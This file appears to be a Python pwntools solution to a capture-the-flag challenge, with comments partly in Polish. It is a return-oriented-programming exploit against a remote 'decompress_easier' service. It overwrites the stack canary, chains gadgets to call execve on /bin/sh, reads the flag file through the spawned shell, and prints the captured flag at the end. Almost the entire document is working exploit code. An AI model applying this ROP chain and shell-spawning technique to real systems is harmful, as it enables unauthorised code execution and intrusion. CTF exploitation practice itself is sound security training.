"""
Return Oriented Programming (ROP)
"""

from pwn import *

# $ ROPgadget --binary /decompress_easier
# i wyszukujemy pozycje odpowiednich gadgetów

# p = process("./decompress_easier")
# gdb.attach(p)
# input()

# Wypisanie layoutu pamięci wirtualnej (np. pod zweryfikowanie offsetów)
# with open(f"/proc/{p.pid}/maps", "r") as f:
#     print(f.read())


# : pop rax ; ret
pop_rax = 0x0000000000449467
# : pop rdi ; ret
pop_rdi = 0x00000000004018c2
# : pop rsi ; ret
pop_rsi = 0x000000000040f38e
# : pop rdx ; ret
pop_rdx = 0x00000000004017cf
# : syscall
syscall = 0x00000000004012d3
# <__libc_csu_init>
libc_csu_init = 0x402f60

remote_addr = 'mim2022.tailcall.net'
easy_port = 30004
hard_port = 30003
p = remote(remote_addr, easy_port)

cmd_read_128 = p16(16) + p16(0)
cmd_read_64 = p16(8) + p16(0)
cmd_0 = p16(0) + p16(0)
p.send(
    p16(1) + p16(0) + p8(0xf8) +
    p16(7) + p16(8 + 8) +
    p16(1016) + p16(0) +
    b'/bin/sh\0'* 127 + # 1024
    p16(8) + p16(0) + b'a'*8 + # len based cmd: fill the gap before canary 1032
    p16(8) + p16(1024 + 264 + 8) + # dist based cmd: rewrite canary and move bufpos to caller_rbp place 1040
    p16(8) + p16(0) + 
    p64(libc_csu_init) + # 1048
    cmd_read_128 + # len based cmd: read 16 bytes
    p64(pop_rax) +
    p64(0x3b) + # syscall's argument that allows opening applications (here /bin/sh)
    cmd_read_64 +
    p64(pop_rdi) + # 1072
    p16(8) + p16(8 + 16 + 8 + 8 + 8 + 1024) + # rewrite the address pointing on "/bin/sh\0" 1080
    cmd_read_128 + # 1096
    p64(pop_rsi) +    # ret skacze do pop rsi ; ret
    p64(0) +                      # rsi <= 0 (argv = NULL)
    cmd_read_128 + # 1112
    p64(pop_rdx) +    # pop rdx ; ret
    p64(0) +                      # rdx <= 0 (envp = NULL)
    cmd_read_64 + # 1128
    p64(syscall) + # 1132
    cmd_0
)  # dist based cmd: read puts's caller_rbp so main's rbp so "/bin/sh\0" address

# p.recvn(1132)

p.send( b'cat /home/pwn/flag.txt\n')

p.interactive()

# FLAGA ES: BSK{N0w_7ry_tH3_H4rd3R_V3R810n}
